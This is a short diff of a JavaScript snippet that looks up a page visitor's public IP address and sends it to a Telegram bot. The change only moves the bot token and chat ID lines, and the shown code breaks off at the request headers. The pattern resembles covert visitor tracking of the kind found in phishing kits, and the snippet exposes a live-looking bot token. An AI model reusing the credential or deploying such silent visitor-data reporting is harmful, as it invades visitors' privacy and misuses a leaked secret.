@@ -1,8 +1,9 @@
-const token = "8072273750:AAHTjGi0qw_S9khhoI1OlJCrIxDdjJ2kcEo"; // thay bằng token thật
-const chatId = "@taptap1997";  // thay bằng chatId thật
+
 fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
     .then(dataIP => {
+        const token = "8072273750:AAHTjGi0qw_S9khhoI1OlJCrIxDdjJ2kcEo"; // thay bằng token thật
+        const chatId = "@taptap1997";  // thay bằng chatId thật
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: "POST",
             headers: {
